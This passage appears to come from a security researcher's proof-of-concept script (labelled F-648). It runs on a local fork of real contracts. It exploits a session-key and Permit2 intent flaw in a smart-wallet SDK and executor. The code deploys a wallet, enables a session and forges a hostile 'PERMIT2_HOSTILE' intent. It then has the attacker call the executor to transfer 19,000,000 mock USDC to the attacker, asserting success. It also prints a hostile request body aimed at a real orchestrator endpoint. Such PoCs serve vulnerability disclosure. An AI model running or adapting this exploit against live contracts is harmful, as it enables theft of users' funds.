  const validUntil = now + BigInt(DEFAULT_SESSION_VALIDITY_SECONDS)

  console.log('\n=== F-648 full-chain PoC (Anvil fork, real contracts + patched SDK) ===')
  console.log('block', await publicClient.getBlockNumber())

  await testClient.setBalance({ address: owner.address, value: 10n ** 18n })
  await testClient.setBalance({ address: attacker.address, value: 10n ** 18n })

  console.log('\n[setup] StandaloneHCAFactory.deploy (fresh userSalt so the fork can rerun)')
  const userSalt = BigInt(Date.now())
  const deployHash = await ownerWallet.writeContract({
    address: c.standaloneHcaFactory,
    abi: factoryAbi,
    functionName: 'deploy',
    args: [owner.address, c.standaloneHcaImplementation, userSalt],
    gas: 3_000_000n,
  })
  const deployReceipt = await publicClient.waitForTransactionReceipt({
    hash: deployHash,
  })
  const deployedLog = deployReceipt.logs.find(
    (l) => l.address.toLowerCase() === c.standaloneHcaFactory.toLowerCase(),
  )
  assert(deployedLog?.topics[1], 'HCADeployed log')
  const hca = (`0x${deployedLog.topics[1].slice(26)}`) as Address
  const onchainOwner = await publicClient.readContract({
    address: hca,
    abi: hcaAbi,
    functionName: 'owner',
  })
  assert(
    onchainOwner.toLowerCase() === owner.address.toLowerCase(),
    'HCA owner',
  )
  const resolver = computeResolverAddress({ chainId: sepolia.id, hca })
  console.log('HCA', hca)
  console.log('resolver', resolver)

  await ownerWallet.writeContract({
    address: c.usdc,
    abi: mockUsdcAbi,
    functionName: 'mint',
    args: [hca, fund],
  })

  const [, sessionNonce] = await publicClient.readContract({
    address: hca,
    abi: hcaAbi,
    functionName: 'ownerAndSessionNonce',
  })
  const salt = computeDestinationSessionSalt({
    hcaSessionNonce: sessionNonce,
    validUntil,
    resolver,
    refundToken: c.usdc,
  })
  const session = {
    chain: sepolia,
    account: hca,
    salt,
    owners: { type: 'ecdsa' as const, accounts: [sessionAccount] },
  } as Session
  const permissionId = getPermissionId(session)
  console.log('permissionId (SDK getPermissionId)', permissionId)

  console.log('[setup] enableSessionWithRefund as HCA (commit-leg already live)')
  await testClient.setBalance({ address: hca, value: 10n ** 18n })
  await testClient.impersonateAccount({ address: hca })
  const hcaWallet = createWalletClient({
    account: hca,
    chain: sepolia,
    transport,
  })
  await hcaWallet.writeContract({
    address: c.hcaOwnerAndSessionValidator,
    abi: validatorAbi,
    functionName: 'enableSessionWithRefund',
    args: [
      permissionId,
      sessionAccount.address,
      validUntil,
      resolver,
      c.usdc,
      MAX_REFUND_EXCHANGE_RATE,
      MAX_REFUND_GAS_OVERHEAD,
      MAX_REFUND_AMOUNT,
    ],
  })
  await testClient.stopImpersonatingAccount({ address: hca })
  assert(
    await publicClient.readContract({
      address: c.hcaOwnerAndSessionValidator,
      abi: validatorAbi,
      functionName: 'isPermissionEnabled',
      args: [hca, permissionId],
    }),
    'session enabled',
  )

  const originOp: Op = {
    vt: ERC7579_ERC1271_VT,
    ops: [
      {
        to: c.usdc,
        value: 0n,
        data: encodeFunctionData({
          abi: mockUsdcAbi,
          functionName: 'transfer',
          args: [attacker.address, steal],
        }),
      },
    ],
  }
  const destOp: Op = {
    vt: ERC7579_ERC1271_VT,
    ops: buildRevealBatch({
      chainId: sepolia.id,
      hca,
      resolver,
      resolverDeployed: false,
      label: 'myname',
      wallet: owner.address,
      secret:
        '0x1111111111111111111111111111111111111111111111111111111111111111' as Hex,
      price: 8_000_021n,
      duration: 31_536_000n,
    }).map((call) => ({ to: call.to, value: call.value, data: call.data })),
  }

  const accountCfg = buildStandaloneAccountConfig(sepolia.id)
  const sdkConfig = {
    account: accountCfg,
    owners: {
      type: 'ecdsa' as const,
      accounts: [owner],
      module: accountCfg.validator,
    },
    experimental_sessions: {
      enabled: true,
      module: accountCfg.validator,
    },
  }

  // ── A. Warp omits settlementLayers, session-signs ─────────────────────
  console.log('\n[A] submitWarpTransaction (their actor) — capture sdkParams')
  let warpParams: Record<string, unknown> | undefined
  const fakeAccount = {
    getAddress: () => hca,
    sendTransaction: async (params: Record<string, unknown>) => {
      warpParams = params
      return { id: 1n }
    },
    waitForExecution: async () => ({
      fill: { hash: `0x${'11'.repeat(32)}` as Hash },
    }),
  } as unknown as RhinestoneAccount
  const warpSigner: RhinestoneSigner = {
    type: 'rhinestone',
    account: fakeAccount,
    config: {
      rhinestoneApiKey: 'poc-not-sent',
      chain: sepolia,
      defaultInfra: 'warp',
    },
    session: { session },
  }
  const warpResult = await submitWarpTransaction({
    request: {
      type: 'rhinestone-intent',
      from: hca,
      chainId: sepolia.id,
      rhinestoneParams: {
        calls: destOp.ops,
        feeAsset: 'USDC',
      },
    },
    signer: warpSigner,
  })
  assert(warpResult.isOk(), `Warp actor ok: ${warpResult.isErr() ? warpResult.error.message : ''}`)
  assert(warpParams, 'Warp captured sendTransaction params')
  assert(
    !('settlementLayers' in warpParams),
    'Warp sdkParams must omit settlementLayers',
  )
  const warpSigners = warpParams.signers as {
    type: string
    verifyExecutions: boolean
    session: unknown
    enableData?: unknown
  }
  assert(warpSigners?.type === 'experimental_session', 'session signers')
  assert(warpSigners.verifyExecutions === true, 'verifyExecutions: true')
  assert(warpSigners.enableData === undefined, 'reveal omits enableData')
  assert(Array.isArray(warpParams.calls), 'calls passed through')
  console.log('  PASS  settlementLayers omitted')
  console.log('  PASS  signers.experimental_session verifyExecutions=true (no wallet)')
  console.log('  keys ', Object.keys(warpParams).sort().join(','))

  // ── B. getIntentMessages ──────────────────────────────────────────────
  console.log('\n[B] patched SDK getIntentMessages')
  const replaceElement = hostileElement({
    hca,
    attacker: attacker.address,
    usdc: c.usdc,
    originOp,
    destOp,
    expires,
    settlementLayer: 'PERMIT2_HOSTILE',
  })
  const honestExecutorElement = {
    ...replaceElement,
    mandate: {
      ...replaceElement.mandate,
      qualifier: {
        encodedVal: '0x' as Hex,
        settlementContext: {
          settlementLayer: 'INTENT_EXECUTOR',
          fundingMethod: 'INTENT_EXECUTOR',
        },
      },
    },
  }
  const replaceMessages = patched.getIntentMessages(
    sdkConfig,
    intentOp(replaceElement, nonce, expires),
  )
  assert(
    replaceMessages.origin[0]?.primaryType === 'PermitBatchWitnessTransferFrom',
    `replace-sole-element primaryType=${replaceMessages.origin[0]?.primaryType}`,
  )
  const appendMessages = patched.getIntentMessages(
    sdkConfig,
    intentOp(replaceElement, nonce, expires, honestExecutorElement),
  )
  assert(
    appendMessages.origin[0]?.primaryType === 'SingleChainOps',
    `append-Permit2 primaryType=${appendMessages.origin[0]?.primaryType} (must be SingleChainOps — append is DEAD)`,
  )
  const destSig = await patched.getTargetExecutionSignature(
    sdkConfig,
    intentOp(replaceElement, nonce, expires),
    sepolia,
    {
      type: 'experimental_session',
      session,
      verifyExecutions: true,
    },
  )
  assert(
    destSig === undefined,
    'hostile PERMIT2_HOSTILE must not dest-sign SingleChainOps',
  )
  console.log('  PASS  replace-sole-element → PermitBatchWitnessTransferFrom')
  console.log('  PASS  append INTENT_EXECUTOR+PERMIT2 → SingleChainOps (DEAD)')
  console.log('  PASS  getTargetExecutionSignature undefined (no dest 0x01)')

  const typedData = replaceMessages.origin[0]
  assert(typedData, 'Permit2 typed data')
  const digest = hashTypedData(typedData as Parameters<typeof hashTypedData>[0])
  console.log('  digest', digest)

  console.log('\n=== hostile POST /intents/route (do not send live) ===')
  console.log(
    JSON.stringify(
      {
        method: 'POST',
        url: 'https://v1.orchestrator.rhinestone.dev/intents/route',
        body: {
          settlementLayer: 'PERMIT2_HOSTILE',
          fundingMethod: 'PERMIT2',
          arbiter: attacker.address,
          nonce: nonce.toString(),
          preClaimOps: originOp.ops.map((o) => ({
            to: o.to,
            value: o.value.toString(),
            data: o.data,
          })),
          destinationOps: destOp.ops.map((o) => ({
            to: o.to,
            value: o.value.toString(),
          })),
        },
      },
      null,
      2,
    ),
  )

  // ── C. their packer ───────────────────────────────────────────────────
  console.log('\n[C] packStandaloneHcaPermit2SessionSignature from patched utils.js')
  const sessionSig = await sessionAccount.sign({ hash: digest })
  const packedSessionSignature = concat([
    '0x00',
    permissionId,
    sessionSig,
  ]) as Hex
  assert(
    (packedSessionSignature.length - 2) / 2 === 98,
    'packed session sig 98 bytes',
  )
  const signature = patched.packStandaloneHcaPermit2SessionSignature(
    sdkConfig,
    {
      type: 'experimental_session',
      session,
      verifyExecutions: true,
    },
    typedData,
    packedSessionSignature,
  )
  const mode = slice(signature, 20, 21)
  assert(mode === '0x03', `packer mode ${mode} (want 0x03)`)
  assert(slice(signature, 0, 20).toLowerCase() === INTENT_EXECUTOR.slice(0, 2) + '0'.repeat(40) || slice(signature, 0, 20) === '0x0000000000000000000000000000000000000000', 'zeroAddress prefix')
  console.log('  PASS  patched packer returned 0x03 envelope,', (signature.length - 2) / 2, 'bytes')

  const hashes = mandateHashes(typedData)
  const preClaimOpsData = encodeExecutorOperation(originOp)
  const destOpsData = encodeExecutorOperation(destOp)

  const beforeHca = await publicClient.readContract({
    address: c.usdc,
    abi: mockUsdcAbi,
    functionName: 'balanceOf',
    args: [hca],
  })
  const beforeAtk = await publicClient.readContract({
    address: c.usdc,
    abi: mockUsdcAbi,
    functionName: 'balanceOf',
    args: [attacker.address],
  })
  console.log('\n=== BEFORE ===')
  console.log('HCA MockUSDC     ', beforeHca.toString())
  console.log('attacker MockUSDC', beforeAtk.toString())

  // ── F first (must run before steal consumes nonce) dest-policy contrast ─
  console.log('\n[F] dest policy: same transfer as destOps must revert')
  const destIsTransfer = hostileElement({
    hca,
    attacker: attacker.address,
    usdc: c.usdc,
    originOp,
    destOp: originOp,
    expires,
    settlementLayer: 'PERMIT2_HOSTILE',
  })
  const destTransferMessages = patched.getIntentMessages(
    sdkConfig,
    intentOp(destIsTransfer, nonce + 1n, expires),
  )
  const destTransferTyped = destTransferMessages.origin[0]
  assert(destTransferTyped, 'dest=transfer typed data')
  const destTransferDigest = hashTypedData(
    destTransferTyped as Parameters<typeof hashTypedData>[0],
  )
  const destTransferSig = await sessionAccount.sign({ hash: destTransferDigest })
  const destTransferEnvelope = patched.packStandaloneHcaPermit2SessionSignature(
    sdkConfig,
    { type: 'experimental_session', session, verifyExecutions: true },
    destTransferTyped,
    concat(['0x00', permissionId, destTransferSig]) as Hex,
  )
  const destTransferHashes = mandateHashes(destTransferTyped)
  let destPolicyReverted = false
  let destPolicySel: string | undefined
  try {
    await publicClient.simulateContract({
      account: attacker.address,
      address: INTENT_EXECUTOR,
      abi: executorAbi,
      functionName: 'executePreClaimOpsWithPermit2Stub',
      args: [
        hca,
        { nonce: nonce + 1n, expires },
        {
          tokenInHash: destTransferHashes.tokenInHash,
          minGas: 1n,
          targetAttributesHash: destTransferHashes.targetAttributesHash,
          destOpsHash: destTransferHashes.destOpsHash,
          qHash: destTransferHashes.qHash,
        },
        { data: encodeExecutorOperation(originOp) },
        destTransferEnvelope,
      ],
    })
  } catch (error) {
    destPolicyReverted = true
    destPolicySel = revertSelector(error)
    const text = String((error as { shortMessage?: string }).shortMessage ?? error)
    console.log('  revert', text.slice(0, 180))
    if (destPolicySel) console.log('  selector', destPolicySel)
  }
  assert(destPolicyReverted, 'dest=transfer must revert')
  assert(
    destPolicySel === '0x8baa579f' || destPolicySel === ACTION_NOT_ALLOWED,
    `dest=transfer selector ${destPolicySel} (want InvalidSignature 0x8baa579f wrapping ActionNotAllowed)`,
  )
  console.log('  PASS  destOps=transfer → InvalidSignature() (validator ActionNotAllowed wrapped by executor)')

  // ── D. steal ──────────────────────────────────────────────────────────
  console.log('\n[D] attacker → executePreClaimOpsWithPermit2Stub (real proxy)')
  const { request } = await publicClient.simulateContract({
    account: attacker.address,
    address: INTENT_EXECUTOR,
    abi: executorAbi,
    functionName: 'executePreClaimOpsWithPermit2Stub',
    args: [
      hca,
      { nonce, expires },
      {
        tokenInHash: hashes.tokenInHash,
        minGas: 1n,
        targetAttributesHash: hashes.targetAttributesHash,
        destOpsHash: hashes.destOpsHash,
        qHash: hashes.qHash,
      },
      { data: preClaimOpsData },
      signature,
    ],
  })
  const stealHash = await attackerWallet.writeContract(request)
  const stealReceipt = await publicClient.waitForTransactionReceipt({
    hash: stealHash,
  })
  assert(stealReceipt.status === 'success', 'steal tx success')
  const afterHca = await publicClient.readContract({
    address: c.usdc,
    abi: mockUsdcAbi,
    functionName: 'balanceOf',
    args: [hca],
  })
  const afterAtk = await publicClient.readContract({
    address: c.usdc,
    abi: mockUsdcAbi,
    functionName: 'balanceOf',
    args: [attacker.address],
  })
  console.log('\n=== AFTER ===')
  console.log('HCA MockUSDC     ', afterHca.toString())
  console.log('attacker MockUSDC', afterAtk.toString())
  console.log('stolen           ', (afterAtk - beforeAtk).toString())
  console.log('tx', stealHash, 'gas', stealReceipt.gasUsed.toString())
  assert(afterAtk - beforeAtk === steal, `stolen ${afterAtk - beforeAtk} != ${steal}`)
  assert(afterHca === fund - steal, `HCA leftover ${afterHca}`)
  console.log('  PASS  19_000_000 MockUSDC moved HCA → attacker')

  // ── E. dest-kill ──────────────────────────────────────────────────────
  console.log('\n[E] dest-kill')
  const nonceUsed = await publicClient.readContract({
    address: INTENT_EXECUTOR,
    abi: executorAbi,
    functionName: 'isPermit2IntentNonceConsumed',
    args: [nonce, hca],
  })
  assert(nonceUsed === true, 'Permit2 nonce consumed')
  console.log('  PASS  isPermit2IntentNonceConsumed(nonce, HCA) = true')

  let destOnlyRouter = false
  try {
    await publicClient.simulateContract({
      account: attacker.address,
      address: INTENT_EXECUTOR,
      abi: executorAbi,
      functionName: 'executeTargetOpsWithPermit2Stub',
      args: [
        hca,
        { nonce, expires },
        {
          sponsor: hca,
          arbiter: attacker.address,
          minGas: 1n,
          notarizedChainId: BigInt(sepolia.id),
          preClaimOpsHash: hashOp(originOp),
          tokenInHash: hashes.tokenInHash,
          qHash: hashes.qHash,
          targetStub: {
            fillExpiry: expires,
            tokenOutHash: hashes.tokenOutHash,
          },
        },
        { data: destOpsData },
        signature,
      ],
    })
  } catch (error) {
    destOnlyRouter = true
    const text = String((error as { shortMessage?: string }).shortMessage ?? error)
    console.log('  dest stub revert', text.slice(0, 160))
    const sel = revertSelector(error)
    if (sel) console.log('  selector', sel)
    assert(
      /OnlyRouter|onlyRouter|0x9e41bdd7/i.test(text) || sel === ONLY_ROUTER,
      `dest stub must be onlyRouter, got: ${text.slice(0, 120)}`,
    )
  }
  assert(destOnlyRouter, 'executeTargetOpsWithPermit2Stub must revert for the attacker')
  console.log('  PASS  dest executeTargetOpsWithPermit2Stub is onlyRouter (attacker cannot land register)')

  console.log('\nALL PASS — Warp omit + getIntentMessages + patched 0x03 packer + steal + dest-kill + dest policy')
  if (spawned) spawned.kill('SIGTERM')
}

main().catch((error) => {
  console.error(error)
  process.exit(1)
})
```
